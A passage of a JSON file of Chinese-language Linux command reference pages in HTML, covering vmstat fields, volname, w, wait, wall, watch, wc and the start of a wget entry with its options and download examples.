class=\"hljs-number\">0</span>    <span class=\"hljs-number\">320</span>  <span class=\"hljs-number\">42188</span> <span class=\"hljs-number\">167332</span> <span class=\"hljs-number\">1534392</span>    <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1002</span>   <span class=\"hljs-number\">39</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">100</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>\n <span class=\"hljs-attribute\">0</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">320</span>  <span class=\"hljs-number\">42188</span> <span class=\"hljs-number\">167336</span> <span class=\"hljs-number\">1534392</span>    <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">19</span> <span class=\"hljs-number\">1002</span>   <span class=\"hljs-number\">44</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">100</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>\n <span class=\"hljs-attribute\">0</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">320</span>  <span class=\"hljs-number\">42188</span> <span class=\"hljs-number\">167336</span> <span class=\"hljs-number\">1534392</span>    <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1002</span>   <span class=\"hljs-number\">41</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">100</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>\n <span class=\"hljs-attribute\">0</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">320</span>  <span class=\"hljs-number\">42188</span> <span class=\"hljs-number\">167336</span> <span class=\"hljs-number\">1534392</span>    <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1002</span>   <span class=\"hljs-number\">41</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">100</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">0</span>\n</code></pre>\n<p> <strong>字段说明：</strong> </p>\n<p>Procs（进程）</p>\n<ul>\n<li>  r: 运行队列中进程数量，这个值也可以判断是否需要增加CPU。（长期大于1）</li>\n<li>  b: 等待IO的进程数量。</li>\n</ul>\n<p>Memory（内存）</p>\n<ul>\n<li>  swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。</li>\n<li>  free: 空闲物理内存大小。</li>\n<li>  buff: 用作缓冲的内存大小。</li>\n<li>  cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多，如果频繁访问到的文件都能被cache处，那么磁盘的读IO bi会非常小。</li>\n</ul>\n<p>Swap</p>\n<ul>\n<li>  si: 每秒从交换区写到内存的大小，由磁盘调入内存。</li>\n<li>  so: 每秒写入交换区的内存大小，由内存调入磁盘。</li>\n</ul>\n<p>注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。</p>\n<p>IO（现在的Linux版本块的大小为1kb）</p>\n<ul>\n<li>  bi: 每秒读取的块数</li>\n<li>  bo: 每秒写入的块数</li>\n</ul>\n<p>注意：随机磁盘读写的时候，这2个值越大（如超出1024k)，能看到CPU在IO等待的值也会越大。</p>\n<p>system（系统）</p>\n<ul>\n<li>  in: 每秒中断数，包括时钟中断。</li>\n<li>  cs: 每秒上下文切换数。</li>\n</ul>\n<p>注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。</p>\n<p>CPU（以百分比表示）</p>\n<ul>\n<li>  us: 用户进程执行时间百分比(user time)</li>\n</ul>\n<p>us的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。</p>\n<ul>\n<li>  sy: 内核系统进程执行时间百分比(system time)</li>\n</ul>\n<p>sy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。</p>\n<ul>\n<li>  wa: IO等待时间百分比</li>\n</ul>\n<p>wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。</p>\n<ul>\n<li>  id: 空闲时间百分比</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "volname",
        "des": "显示指定的ISO-9660格式的设备的卷名称",
        "body": "<h1 id=\"volname\">volname</h1>\n<p>显示指定的ISO-9660格式的设备的卷名称</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>volname命令</strong> 用于显示指定的“ISO-9660”格式的设备的卷名称，通常这种格式的设备为光驱。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">volname</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>设备文件名：指定要显示卷名称的设备。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "w",
        "des": "显示目前登入系统的用户信息",
        "body": "<h1 id=\"w\">w</h1>\n<p>显示目前登入系统的用户信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>w命令</strong> 用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。执行这个命令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">w</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"> -h, <span class=\"hljs-comment\">--no-header     不打印头信息；</span>\n -u, <span class=\"hljs-comment\">--no-current    当显示当前进程和cpu时间时忽略用户名；</span>\n -s, <span class=\"hljs-comment\">--short         使用短输出格式；</span>\n -f, <span class=\"hljs-comment\">--from          显示用户从哪登录；</span>\n -o, <span class=\"hljs-comment\">--old-style     老式输出</span>\n -i, <span class=\"hljs-comment\">--ip-addr       显示IP地址而不是主机名（如果可能）</span>\n\n     <span class=\"hljs-comment\">--help     显示此帮助并退出</span>\n -V, <span class=\"hljs-comment\">--version  显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户：仅显示指定用户。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">w</span>\n <span class=\"hljs-attribute\">20</span>:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">37</span> up <span class=\"hljs-number\">136</span> days,  <span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">58</span>,  <span class=\"hljs-number\">1</span> user,  load average: <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>\n<span class=\"hljs-attribute\">USER</span>     TTY      FROM              login@   IDLE   JCPU   PCPU WHAT\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">222.94.97.122</span>    <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">39</span>    <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">00</span>s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>s  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>s w\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "wait",
        "des": "等待进程执行完后返回",
        "body": "<h1 id=\"wait\">wait</h1>\n<p>等待进程执行完后返回</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>wait命令</strong> 用来等待指令的指令，直到其执行完毕后返回终端。该指令常用于shell脚本编程中，待指定的指令执行完成后，才会继续执行后面的任务。该指令等待作业时，在作业标识号前必须添加备份号\"%\"。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">wait</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>进程或作业标示：指定进程号或者作业号。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用命令wait等待作业号为1的作业完成后再返回，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">wait</span> %1       <span class=\"hljs-comment\">#等待作业号为3的作业完成 </span>\n</code></pre>\n<p>执行上面的指令后，将输出指定作业号的指令，如下所示：</p>\n<pre><code class=\"language-shell\">find / -<span class=\"hljs-type\">name</span> <span class=\"hljs-keyword\">password</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "wall",
        "des": "向系统当前所有打开的终端上输出信息",
        "body": "<h1 id=\"wall\">wall</h1>\n<p>向系统当前所有打开的终端上输出信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>wall命令</strong> 用于向系统当前所有打开的终端上输出信息。通过wall命令可将信息发送给每位同意接收公众信息的终端机用户，若不给予其信息内容，则wall命令会从标准输入设备读取数据，然后再把所得到的数据传送给所有终端机用户。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">wall</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>消息：指定广播消息。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[<span class=\"hljs-symbol\">root@</span>localhost ~]# wall <span class=\"hljs-keyword\">this</span> <span class=\"hljs-keyword\">is</span> a test line\n\nBroadcast message from root (pts/<span class=\"hljs-number\">1</span>) (Fri Dec <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">36</span>:<span class=\"hljs-number\">51</span> <span class=\"hljs-number\">2013</span>):\n\n<span class=\"hljs-keyword\">this</span> <span class=\"hljs-keyword\">is</span> a test line\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "watch",
        "des": "可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令/定时执行命令",
        "body": "<h1 id=\"watch\">watch</h1>\n<p>可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令/定时执行命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>watch命令</strong> 以周期性的方式执行给定的指令，指令输出以全屏方式显示。watch是一个非常实用的命令，基本所有的Linux发行版都带有这个小工具，如同名字一样，watch可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">watch</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>n <span class=\"hljs-comment\"># 或--interval  watch缺省每2秒运行一下程序，可以用-n或-interval来指定间隔的时间。</span>\n<span class=\"hljs-literal\">-</span>d <span class=\"hljs-comment\"># 或--differences  用-d或--differences 选项watch 会高亮显示变化的区域。 而-d=cumulative选项会把变动过的地方(不管最近的那次有没有变动)都高亮显示出来。</span>\n<span class=\"hljs-literal\">-</span>t <span class=\"hljs-comment\"># 或-no-title  会关闭watch命令在顶部的时间间隔,命令，当前时间的输出。</span>\n<span class=\"hljs-literal\">-</span>h, --help <span class=\"hljs-comment\"># 查看帮助文档</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指令：需要周期性执行的指令。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">watch -n <span class=\"hljs-number\">1</span> -d netstat -ant &nbsp; &nbsp; &nbsp; <span class=\"hljs-meta\"># 命令：每隔一秒高亮显示网络链接数的变化情况</span>\nwatch -n <span class=\"hljs-number\">1</span> -d <span class=\"hljs-string\">'pstree|grep http'</span> <span class=\"hljs-meta\"># 每隔一秒高亮显示http链接数的变化情况。 后面接的命令若带有管道符，需要加''将命令区域归整。</span>\nwatch <span class=\"hljs-string\">'netstat -an | grep:21 | \\ grep&lt;模拟攻击客户机的IP&gt;| wc -l'</span> <span class=\"hljs-meta\"># 实时查看模拟攻击客户机建立起来的连接数</span>\nwatch -d <span class=\"hljs-string\">'ls -l|grep scf'</span>       <span class=\"hljs-meta\"># 监测当前目录中 scf' 的文件的变化</span>\nwatch -n <span class=\"hljs-number\">10</span> <span class=\"hljs-string\">'cat /proc/loadavg'</span> <span class=\"hljs-meta\"># 10秒一次输出系统的平均负载</span>\nwatch uptime\nwatch -t uptime\nwatch -d -n <span class=\"hljs-number\">1</span> netstat -ntlp\nwatch -d <span class=\"hljs-string\">'ls -l | fgrep goface'</span>     <span class=\"hljs-meta\"># 监测goface的文件</span>\nwatch -t -differences=cumulative uptime\nwatch -n <span class=\"hljs-number\">60</span> <span class=\"hljs-keyword\">from</span>            <span class=\"hljs-meta\"># 监控mail</span>\nwatch -n <span class=\"hljs-number\">1</span> <span class=\"hljs-string\">\"df -i;df\"</span>       <span class=\"hljs-meta\"># 监测磁盘inode和block数目变化情况</span>\n</code></pre>\n<p>FreeBSD和Linux下watch命令的不同，在Linux下，watch是周期性的执行下个程序，并全屏显示执行结果，如：<code>watch -n 1 -d netstat -ant</code>，而在FreeBSD下的watch命令是查看其它用户的正在运行的操作，watch允许你偷看其它terminal正在做什么，该命令只能让超级用户使用。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "wc",
        "des": "统计文件的字节数、字数、行数",
        "body": "<h1 id=\"wc\">wc</h1>\n<p>统计文件的字节数、字数、行数</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>wc命令</strong> 统计指定文件中的字节数、字数、行数，并将统计结果显示输出。利用wc指令我们可以计算文件的Byte数、字数或是列数，若不指定文件名称，或是所给予的文件名为“-”，则wc指令会从标准输入设备读取数据。wc同时也给出所指定文件的总统计数。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">wc</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\nwc <span class=\"hljs-selector-attr\">[选项]</span>... <span class=\"hljs-selector-attr\">[文件]</span>...\nwc <span class=\"hljs-selector-attr\">[选项]</span>... --files0-from=F\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>c <span class=\"hljs-comment\"># 统计字节数，或--bytes或——chars：只显示Bytes数；。</span>\n<span class=\"hljs-literal\">-</span>l <span class=\"hljs-comment\"># 统计行数，或——lines：只显示列数；。</span>\n<span class=\"hljs-literal\">-</span>m <span class=\"hljs-comment\"># 统计字符数。这个标志不能与 -c 标志一起使用。</span>\n<span class=\"hljs-literal\">-</span>w <span class=\"hljs-comment\"># 统计字数，或——words：只显示字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。</span>\n<span class=\"hljs-literal\">-</span>L <span class=\"hljs-comment\"># 打印最长行的长度。</span>\n<span class=\"hljs-literal\">-</span>help     <span class=\"hljs-comment\"># 显示帮助信息</span>\n<span class=\"hljs-literal\">-</span>-version <span class=\"hljs-comment\"># 显示版本信息</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：需要统计的文件列表。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">wc</span> -l *       <span class=\"hljs-comment\"># 统计当前目录下的所有文件行数及总计行数。</span>\nwc -l <span class=\"hljs-regexp\">*.js</span>    <span class=\"hljs-comment\"># 统计当前目录下的所有 .js 后缀的文件行数及总计行数。</span>\nfind  . * | xargs wc -l <span class=\"hljs-comment\"># 当前目录以及子目录的所有文件行数及总计行数。</span>\n</code></pre>\n<p>查看文件的字节数、字数、行数</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">wc</span> test.txt\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-attribute\">7</span>     <span class=\"hljs-number\">8</span>     <span class=\"hljs-number\">70</span>     test.txt\n<span class=\"hljs-comment\"># 行数 单词数 字节数 文件名</span>\n</code></pre>\n<p>用wc命令怎么做到只打印统计数字不打印文件名</p>\n<pre><code class=\"language-shell\">wc -l &lt; <span class=\"hljs-keyword\">test</span>.txt\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-number\">7</span>\n</code></pre>\n<p>用来统计当前目录下的文件数(不包含隐藏文件)</p>\n<pre><code class=\"language-shell\"># 要去除TOTAL行\nexpr <span class=\"hljs-constructor\">$(<span class=\"hljs-params\">ls</span> -<span class=\"hljs-params\">l</span> | <span class=\"hljs-params\">wc</span> -<span class=\"hljs-params\">l</span>)</span> - <span class=\"hljs-number\">1</span>\n# 输出结果\n<span class=\"hljs-number\">8</span>\n</code></pre>\n<p>统计当前目录下的所有文件行数及总计行数</p>\n<pre><code class=\"language-shell\">[root@centos7 ~]# wc -l *\n      <span class=\"hljs-number\">21</span> LICENSE\n     <span class=\"hljs-number\">270</span> README.md\nwc: example: <span class=\"hljs-keyword\">read</span>: <span class=\"hljs-keyword\">Is</span> a directory\n     <span class=\"hljs-number\">785</span> lerna-<span class=\"hljs-keyword\">debug</span>.<span class=\"hljs-keyword\">log</span>\n      <span class=\"hljs-number\">25</span> lerna.json\nwc: node_modules: <span class=\"hljs-keyword\">read</span>: <span class=\"hljs-keyword\">Is</span> a directory\n   <span class=\"hljs-number\">23603</span> package-<span class=\"hljs-keyword\">lock</span>.json\n      <span class=\"hljs-number\">79</span> package.json\n       <span class=\"hljs-number\">3</span> renovate.json\n   <span class=\"hljs-number\">24786</span> total\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "wget",
        "des": "Linux系统下载文件工具",
        "body": "<h1 id=\"wget\">wget</h1>\n<p>Linux系统下载文件工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>wget命令</strong> 用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p>\n<p>wget支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。所谓的自动下载是指，wget可以在用户退出系统的之后在后台执行。这意味这你可以登录系统，启动一个wget下载任务，然后退出系统，wget将在后台执行直到任务完成，相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。</p>\n<p>用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。wget虽然功能强大，但是使用起来还是比较简单：</p>\n<ol>\n<li><strong>支持断点下传功能</strong> 这一点，也是网络蚂蚁和FlashGet当年最大的卖点，现在，Wget也可以使用此功能，那些网络不是太好的用户可以放心了；</li>\n<li><strong>同时支持FTP和HTTP下载方式</strong> 尽管现在大部分软件可以使用HTTP方式下载，但是，有些时候，仍然需要使用FTP方式下载软件；</li>\n<li><strong>支持代理服务器</strong> 对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上，所以，支持代理是下载软件必须有的功能；</li>\n<li><strong>设置方便简单</strong> 可能，习惯图形界面的用户已经不是太习惯命令行了，但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标；</li>\n<li><strong>程序小，完全免费</strong> 程序小可以考虑不计，因为现在的硬盘实在太大了；完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。</li>\n</ol>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">wget <span class=\"hljs-selector-attr\">[参数]</span> <span class=\"hljs-selector-attr\">[URL地址]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">启动参数：\n\n-V, –-version 显示wget的版本后退出\n-h, –-help 打印语法帮助\n-b, –-background 启动后转入后台执行\n-e, –<span class=\"hljs-attribute\">-execute</span>=COMMAND 执行 `.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc\n\n记录和输入文件参数：\n\n-o, –<span class=\"hljs-attribute\">-output-file</span>=FILE 把记录写到FILE文件中\n-a, –<span class=\"hljs-attribute\">-append-output</span>=FILE 把记录追加到FILE文件中\n-d, –-<span class=\"hljs-built_in\">debug</span> 打印调试输出\n-q, –-quiet 安静模式(没有输出)\n-v, –-verbose 冗长模式(这是缺省设置)\n-nv, –-non-verbose 关掉冗长模式，但不是安静模式\n-i, –<span class=\"hljs-attribute\">-input-file</span>=FILE 下载在FILE文件中出现的URLs\n-F, –-force-html 把输入文件当作HTML格式文件对待\n-B, –<span class=\"hljs-attribute\">-base</span>=URL 将URL作为在-F -i参数指定的文件中出现的相对链接的前缀\n–<span class=\"hljs-attribute\">-sslcertfile</span>=FILE 可选客户端证书\n–<span class=\"hljs-attribute\">-sslcertkey</span>=KEYFILE 可选客户端证书的KEYFILE\n–<span class=\"hljs-attribute\">-egd-file</span>=FILE 指定EGD socket的文件名\n\n下载参数：\n\n–<span class=\"hljs-attribute\">-bind-address</span>=ADDRESS 指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用)\n-t, –<span class=\"hljs-attribute\">-tries</span>=NUMBER 设定最大尝试链接次数(0 表示无限制).\n-O –<span class=\"hljs-attribute\">-output-document</span>=FILE 把文档写到FILE文件中\n-nc, –-no-clobber 不要覆盖存在的文件或使用.#前缀\n-c, –-continue 接着下载没下载完的文件\n–<span class=\"hljs-attribute\">progress</span>=TYPE 设定进程条标记\n-N, –-timestamping 不要重新下载文件除非比本地文件新\n-S, –-server-response 打印服务器的回应\n–-spider 不下载任何东西\n-T, –<span class=\"hljs-attribute\">-timeout</span>=SECONDS 设定响应超时的秒数\n-w, –<span class=\"hljs-attribute\">-wait</span>=SECONDS 两次尝试之间间隔SECONDS秒\n–<span class=\"hljs-attribute\">waitretry</span>=SECONDS 在重新链接之间等待1…SECONDS秒\n–random-wait 在下载之间等待0…2*WAIT秒\n-Y, –<span class=\"hljs-attribute\">-proxy</span>=on/off 打开或关闭代理\n-Q, –<span class=\"hljs-attribute\">-quota</span>=NUMBER 设置下载的容量限制\n-–<span class=\"hljs-attribute\">limit-rate</span>=RATE 限定下载输率\n\n目录参数：\n\n-nd –-no-directories 不创建目录\n-x, –-force-directories 强制创建目录\n-nH, –-no-host-directories 不创建主机目录\n-P, –<span class=\"hljs-attribute\">-directory-prefix</span>=PREFIX 将文件保存到目录 PREFIX/…\n–<span class=\"hljs-attribute\">cut-dirs</span>=NUMBER 忽略 NUMBER层远程目录\n\nHTTP 选项参数：\n\n-–<span class=\"hljs-attribute\">http-user</span>=USER 设定HTTP用户名为 USER.\n-–<span class=\"hljs-attribute\">http-passwd</span>=PASS 设定http密码为 PASS\n-C, –<span class=\"hljs-attribute\">-cache</span>=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许)\n-E, –-html-extension 将所有text/html文档以.html扩展名保存\n-–ignore-length 忽略 `Content-Length’头域\n-–<span class=\"hljs-attribute\">header</span>=STRING 在headers中插入字符串 STRING\n-–<span class=\"hljs-attribute\">proxy-user</span>=USER 设定代理的用户名为<span class=\"hljs-built_in\"> USER\n</span>-–<span class=\"hljs-attribute\">proxy-passwd</span>=PASS 设定代理的密码为 PASS\n-–<span class=\"hljs-attribute\">referer</span>=URL 在HTTP请求中包含 `Referer: URL’头\n-s, –-save-headers 保存HTTP头到文件\n-U, –<span class=\"hljs-attribute\">-user-agent</span>=AGENT 设定代理的名称为 AGENT而不是 Wget/VERSION\n-–no-http-keep-alive 关闭 HTTP活动链接 (永远链接)\n–<span class=\"hljs-attribute\">-cookies</span>=off 不使用 cookies\n–<span class=\"hljs-attribute\">-load-cookies</span>=FILE 在开始会话前从文件 FILE中加载cookie\n-–<span class=\"hljs-attribute\">save-cookies</span>=FILE 在会话结束后将 cookies保存到 FILE文件中\n\nFTP 选项参数：\n\n-nr, -–dont-remove-listing 不移走 `.listing’文件\n-g, -–<span class=\"hljs-attribute\">glob</span>=on/off 打开或关闭文件名的 globbing机制\n-–passive-ftp 使用被动传输模式 (缺省值).\n-–active-ftp 使用主动传输模式\n-–retr-symlinks 在递归的时候，将链接指向文件(而不是目录)\n\n递归下载参数：\n\n-r, -–recursive 递归下载－－慎用!\n-l, -–<span class=\"hljs-attribute\">level</span>=NUMBER 最大递归深度 (inf 或 0 代表无穷)\n–-delete-after 在现在完毕后局部删除文件\n-k, –-convert-links 转换非相对链接为相对链接\n-K, –-backup-converted 在转换文件X之前，将之备份为 X.orig\n-m, –-mirror 等价于 -r -N -l inf -nr\n-p, –-page-requisites 下载显示HTML文件的所有图片\n\n递归下载中的包含和不包含(accept/reject)：\n\n-A, –<span class=\"hljs-attribute\">-accept</span>=LIST 分号分隔的被接受扩展名的列表\n-R, –<span class=\"hljs-attribute\">-reject</span>=LIST 分号分隔的不被接受的扩展名的列表\n-D, –<span class=\"hljs-attribute\">-domains</span>=LIST 分号分隔的被接受域的列表\n–<span class=\"hljs-attribute\">-exclude-domains</span>=LIST 分号分隔的不被接受的域的列表\n–-follow-ftp 跟踪HTML文档中的FTP链接\n–<span class=\"hljs-attribute\">-follow-tags</span>=LIST 分号分隔的被跟踪的HTML标签的列表\n-G, –<span class=\"hljs-attribute\">-ignore-tags</span>=LIST 分号分隔的被忽略的HTML标签的列表\n-H, –-span-hosts 当递归时转到外部主机\n-L, –-relative 仅仅跟踪相对链接\n-I, –<span class=\"hljs-attribute\">-include-directories</span>=LIST 允许目录的列表\n-X, –<span class=\"hljs-attribute\">-exclude-directories</span>=LIST 不被包含目录的列表\n-np, –-no-parent 不要追溯到父目录\nwget -S –-spider url 不下载只显示过程\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>URL：下载指定的URL地址。</p>\n<h3 id=\"实例\">实例</h3>\n<p><strong>使用wget下载单个文件</strong> </p>\n<pre><code class=\"language-shell\">wget http:<span class=\"hljs-regexp\">//</span>www.jsdig.com/testfile.zip\n</code></pre>\n<p>以下的例子是从网络下载一个文件并保存在当前目录，在下载的过程中会显示进度条，包含（下载完成百分比，已经下载的字节，当前下载速度，剩余下载时间）。</p>\n<p><strong>下载并以不同的文件名保存</strong> </p>\n<pre><code class=\"language-shell\">wget -O wordpress.zip http:<span class=\"hljs-regexp\">//</span>www.jsdig.com/download.aspx?id=<span class=\"hljs-number\">1080</span>\n</code></pre>\n<p>wget默认会以最后一个符合<code>/</code>的后面的字符来命令，对于动态链接的下载通常文件名会不正确。</p>\n<p>错误：下面的例子会下载一个文件并以名称<code>download.aspx?id=1080</code>保存:</p>\n<pre><code class=\"language-shell\">wget http:<span class=\"hljs-regexp\">//</span>www.jsdig.com/download?id=<span class=\"hljs-number\">1</span>\n</code></pre>\n<p>即使下载的文件是zip格式，它仍然以<code>download.php?id=1080</code>命名。</p>\n<p>正确：为了解决这个问题，我们可以使用参数<code>-O</code>来指定一个文件名：</p>\n<pre><code class=\"language-shell\">wget -O wordpress.zip http:<span class=\"hljs-regexp\">//</span>www.jsdig.com/download.aspx?id=<span class=\"hljs-number\">1080</span>\n</code></pre>\n<p><strong>wget限速下载</strong> </p>\n<pre><code class=\"language-shell\">wget --limit-rate=<span class=\"hljs-number\">300</span>k http:<span class=\"hljs-regexp\">//</span>www.jsdig.com/testfile.zip\n</code></pre>\n<p>当你执行wget的时候，它默认会占用全部可能的宽带下载。但是当你准备下载一个大文件，而你还需要下载其它文件时就有必要限速了。</p>\n<p><strong>使用wget断点续传</strong> </p>\n<pre><code class=\"language-shell\">wget -c http:<span class=\"hljs-regexp\">//</span>www.jsdig.com/testfile.zip\n</code></pre>\n<p>使用<code>wget&nbsp;-c</code>重新启动下载中断的文件，对于我们下载大文件时突然由于网络等原因中断非常有帮助，我们可以继续接着下载而不是重新下载一个文件。需要继续中断的下载时可以使用<code>-c</code>参数。</p>\n<p><strong>使用wget后台下载</strong> </p>\n<pre><code class=\"language-shell\">wget -<span class=\"hljs-keyword\">b</span> http://www.jsdig.<span class=\"hljs-keyword\">com</span>/testfile.zip\n\nContinuing in background, pid <span class=\"hljs-number\">1840</span>.\nOutput will <span class=\"hljs-keyword\">be</span> written <span class=\"hljs-keyword\">to</span> `wget-<span class=\"hljs-built_in\">log</span><span class=\"hljs-string\">'.</span>\n</code></pre>\n<p>对于下载非常大的文件的时候，我们可以使用参数<code>-b</code>进行后台下载，你可以使用以下命令来察看下载进度：</p>\n<pre><code class=\"language-shell\">tail <span class=\"hljs-operator\">-f</span> w<span class=\"hljs-built_in\">get-log</span>\n</code></pre>\n<p><strong>伪装代理名称下载</strong> </p>\n<pre><code class=\"language-shell\">wget 